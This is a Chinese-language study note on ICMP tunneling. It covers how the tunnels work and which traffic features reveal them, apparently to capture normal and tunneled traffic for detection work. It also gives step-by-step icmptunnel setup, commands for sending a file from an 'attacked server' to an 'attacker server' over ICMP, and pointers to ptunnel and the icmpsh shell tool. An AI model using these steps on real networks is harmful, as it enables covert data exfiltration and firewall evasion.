# ICMP


## ICMP隧道

### 原理

通过ICMP echo（ping request）和reply（ping reply）实现隧道。

请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64 比特，但实际上协议允许附加最大 64K 大小的 Payload。这里的payload便可用来进行数据传输。

### 场景

适用于防火墙只允许ping出站流量的环境：

`Client - [FireWall] - Proxy Server - Internet`

![1](pic/ICMP1.png)

文件传输



Web访问





### 检测隧道

下面是一些检测恶意 ICMP 流量的方法：

- 检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包。而使用 ICMP 隧道的浏览器在同一时间会产生上千个 ICMP 数据包。
- 注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64 比特，这样会使得更难以被检测到。
- 寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。
- 检查 ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMP payload 前面增加 'TUNL' 标记以用于识别隧道，这就是特征。(0x450000)

#### 可用信标

- 单位时间内的ICMP请求数量、响应数量


- 单位时间内的ICMP消息平均长度


- 响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包数量


- ICMP 数据包的协议标签（工具加入的特征）



#### 测试过程

取单位时间，**10s**

执行命令如下：

```
tcpdump -i ens33 -t -s 0 -w ./target.cap & curl www.baidu.com & curl www.acfun.cn & curl www.bilibili.com & curl www.taobao.com &
sleep 10
kill `ps aux | grep tcpdump | grep -v grep | awk '{print $2}'`
```

![2](pic/ICMP2.png)



- 单位时间内，所有请求消息的消息数量**（$\_###\_req\_msg\_num）**，以及所有响应消息的消息平均数量**（$\_###\_resp\_msg\_num）**
- 单位时间内，所有请求消息的Data平均长度**（$\_###\_req\_msg\_length）**，以及所有响应消息的Data平均长度**（$\_###\_resp\_msg\_length）**
- 单位时间内，响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包数量**（$\_###\_diff\_msg\_num）**。
- ICMP 数据包的协议标签 **（$\_###\_msg\_tag）**




### DNS正常与异常数据流量自动化生成与捕获

#### 文件传输

icmp_transmitter

https://github.com/NotSoSecure/icmp_tunnel_ex_filtrate

|name|description|
|-|-----|
|被攻击服务器|192.168.1.101|
|攻击者服务器|192.168.1.120|
|传输文件|*.icmp.log|

#### 操作：

生成传输文件：

```python
import random
import string
import sys

prefix = sys.argv[-1] if len(sys.argv) == 2 else "test"

for i in range(30):
    name = ''.join(random.sample(string.ascii_lowercase, 5))
    f = open("{}.{}.log".format(name, prefix), 'a')
    f.write("".join(random.sample(string.ascii_letters+string.digits, 62)))
    f.close()
```


#### Web访问

#### 生成被传输文件：

```python
#log文件生成
import random
import string
import sys
 
prefix = sys.argv[-1] if len(sys.argv) == 2 else "test"
 
for i in range(30):
    name = ''.join(random.sample(string.ascii_lowercase, 5))
    f = open("{}.{}.log".format(name, prefix), 'a')
    f.write("".join(random.sample(string.ascii_letters+string.digits, 62)))
    f.close()
```

#### ssh认证

scp传输前需要先做好ssh认证，不然要一直输入密码

客户端先生成密钥：`ssh-keygen -t rsa`

然后`/root/.ssh/id_rsa.pub`内容添加到服务端的`/root/.ssh/authorized_keys`中就行了

或者拷贝文件过去

`scp ~/.ssh/id_rsa.pub 192.168.100.4:/root/.ssh/authorized_keys`

#### 传输文件、打包Pcap

```bash
#传输文件、打包Pcap

#!/bin/sh

for i in $(find log/ -name "*.log")
do
    echo "[*] processing: ${i##*/}"
    while true
    do
        nohup tcpdump -i ens33 -w $i.pcap &
        scp -C $i root@192.168.1.118:/root/pcap/icmp/
        curl "www.taobao.com"
        if [ $? -eq 0 ]; then
            break
        fi
        ps aux | grep tcpdump | grep -v grep | awk '{print $2}' | sudo xargs kill -9
    done
done
ps aux | grep tcpdump | grep -v grep | awk '{print $2}' | sudo xargs kill -9
```


### 工具

#### icmptunnel

Transparently tunnel your IP traffic through ICMP echo and reply packets.

官网：https://dhavalkapil.com/icmptunnel/

#### 结构

整体结构：

```
+--------------+                         +------------+
|              |       ICMP traffic      |            |       IP traffic
|    Client    |  ------------------->   |   Proxy    |   ------------------>
|              |  <-------------------   |   Server   |   <------------------
|              |    through restricted   |            |     proper internet
+--------------+         internet        +------------+
```

客户端结构：

```
+--------------+                                    +------------+
|              |  IP traffic  +------+  IP traffic  |            |   ICMP traffic
|     User     |  --------->  | tun0 |  --------->  | icmptunnel | --------------->
| Applications |  <---------  +------+  <---------  |  program   | <---------------
|              |        (Virtual Interface)         |            |    restricted 
+--------------+                                    +------------+     internet
```

代理端结构：

```
                 +------------+
  ICMP traffic   |            |  IP traffic     +------+       NAT/Masquerading
---------------> | icmptunnel | ------------>   | tun0 |    ---------------------> 
<--------------- |  program   | <------------   +------+    <---------------------
   restricted    |            |           (Virtual Interface)   proper internet
    internet     +------------+
```

#### 使用方法

环境：

| Side         | 系统         | IP            |
| ------------ | ---------- | ------------- |
| client       | 虚拟机，CentOS | 192.168.1.116 |
| Proxy server | 虚拟机，CentOS | 192.168.1.118 |

Proxy Server和Client都从 Github 上面 clone 下代码：

```
git clone https://github.com/DhavalKapil/icmptunnel.git
```

随后使用 `make` 命令进行编译即可。

> 注：这款工具只能在 Linux 下面使用。

Proxy Server端配置

1）启动：

```shell
[sudo] ./icmptunnel -s 10.0.1.1
```

Client端配置

1）配置client.sh

使用`route -n`查看本机的路由表，然后配置client.sh，将`route add -host <server> gw <gateway> dev <interface>`这一句，修改成本机环境的相应情况，如这里要配置\<server\>为Proxy Server的IP地址`192.168.1.118`，而\<gateway\>则为`0.0.0.0`，\<interface\>则为网卡，我的为`ens33`（一般是eth0）。

![3](pic/ICMP3.png)

2）查看DNS解析

`vi /etc/resolv.conf`

查看Client与Proxy Server的DNS解析地址，确保两者的解析地址一样。如都为`8.8.8.8`。

3）启动：

```
[sudo] ./icmptunnel -c <server> &
```

这里的\<server\>为Proxy Server的IP地址，注意加&，放在后台运行。

然后就会看到这样的DEBUG信息，配置到此已经完成。

![](pic/ICMP5.png)

#### 测试抓包

开启tcpdump抓包

`tcpdump -i ens33 -t -s 0 -c 100 -w ./target.cap &`

使用curl产生流量

`curl www.baidu.com`

target.cap包如下，可以看到数据内容包含在icmp包Data中

![](pic/ICMP4.png)


#### Data Ex-filteration over ICMP Tunnel

https://github.com/NotSoSecure/icmp_tunnel_ex_filtrate


被攻击服务器：

`icmp_transmitter.exe "input_file_to_be_sent" "IP_address_to_be_sent"`

（无python环境的Windows则可使用`ICMP_transmitter.exe`）

攻击者服务器：

先抓取流量包

```shell
sudo tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo -XX -vvv -w output.txt
```

parser.sh来解析输出文件

`./parser.sh`

base64解码

`certutil -decode "base_64_encoded_textfile" "file.extention"`


#### ptunnel

官网：http://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/

下载：http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz





#### 场景与优势

适用于防火墙只允许ping出站流量的环境

支持多并发连接，性能优

充足的带宽（150kb/s 下行，50kb/s上行）

支持身份认证，阻止其它人使用此代理

使用时需要root用户，最好客户端和服务端都是root权限。







#### icmpsh

https://github.com/inquisb/icmpsh










### 资料

RFC792

http://www.ietf.org/rfc/rfc792.txt

icmptunnel wiki

https://en.wikipedia.org/wiki/ICMP_tunnel

dns与icmp隧道

http://netsecurity.51cto.com/art/201701/528247.htm

利用 ICMP 隧道穿透防火墙

http://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/

ICMP隧道 ptunnle

http://www.cnblogs.com/zylq-blog/p/6747217.html

The ICMP Tunnel

https://oing9179.github.io/blog/2017/06/The-ICMP-Tunnel/

ICMP Tunnels – A Case Study

https://www.notsosecure.com/icmp-tunnels-a-case-study/

通过ICMP隧道进行文件传输

http://www.mottoin.com/89600.html

利用icmp隧道 轻松穿透 tcp/udp四层 封锁

https://klionsec.github.io/2017/10/31/icmp-tunnel/

dpkt Tutorial #1: ICMP Echo

https://bbs.pediy.com/thread-213074.htm